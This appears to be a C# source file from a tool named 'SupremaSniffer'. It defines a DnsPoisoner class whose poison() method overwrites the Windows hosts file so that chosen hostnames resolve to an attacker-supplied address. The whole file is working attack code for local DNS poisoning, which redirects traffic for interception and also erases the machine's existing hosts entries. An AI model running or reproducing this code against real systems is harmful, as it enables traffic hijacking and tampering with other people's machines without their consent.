namespace SupremaSniffer
{
    internal class DnsPoisoner
    {
        private string fakeHost;
        private List<string> hosts = new List<string>();

        public DnsPoisoner(string fakeHost, string[] hosts)
        {
            this.fakeHost = fakeHost;
            this.hosts.AddRange(hosts);
        }

        /*
         * Totally overrides hosts file, not always appropriate
         */
        public void poison()
        {
            string localDnsFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "drivers/etc/hosts");
            List<string> hostsFileFormattedHosts = new List<string>();
            foreach(var host in hosts)
            {
                hostsFileFormattedHosts.Add(fakeHost + "    " + host);
            }
            File.WriteAllLines(localDnsFile, hostsFileFormattedHosts);
        }
    }
}
